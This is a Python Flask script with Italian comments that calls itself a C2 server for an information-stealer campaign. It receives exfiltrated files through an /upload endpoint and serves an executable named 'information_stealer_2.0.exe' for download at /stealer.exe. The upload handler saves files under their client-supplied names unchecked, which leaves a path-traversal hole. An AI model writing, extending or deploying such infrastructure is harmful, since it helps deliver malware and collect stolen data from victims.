import os
from flask import Flask, request, send_file, send_from_directory, jsonify

app = Flask(__name__)

# Cartella in cui il server C2 riceve i file
UPLOAD_FOLDER = r'Version_3.0/uploads'  # La cartella per i file caricati
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# La cartella 'uploads' esista
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

@app.route('/upload', methods=['POST'])
def upload_file():
    try:
        # Controlla se c'è un file nella richiesta
        if 'file' not in request.files:
            return 'No file part', 400

        file = request.files['file']

        # Controlla se il file ha un nome valido
        if file.filename == '':
            return 'No selected file', 400

        # Ottieni il nome del file e crea il percorso di salvataggio
        filename = file.filename
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)

        # Salva il file nella cartella 'uploads'
        file.save(file_path)
        print(f"File salvato in: {file_path}")  # Messaggio di debug

        return 'File successfully uploaded', 200
    except Exception as e:
        print(f"Errore durante il salvataggio del file: {e}")
        return jsonify(error=str(e)), 500


@app.route('/', methods=['GET'])
def home():
    return '<h1>Il server è online</h1>', 200


# route per scaricare lo stealer
@app.route('/stealer.exe', methods=['GET'])
def download_stealer():
    stealer_filename = 'information_stealer_2.0.exe'  # Nome del file stealer
    return send_from_directory('dist', stealer_filename, as_attachment=True)

if __name__ == '__main__':
    #app.run(debug=False, host='127.0.0.1', port=5000)
    #app.run(debug=False, host='192.168.1.3', port=5000)
    app.run(debug=False, host='10.211.55.5:5000', port=5000)

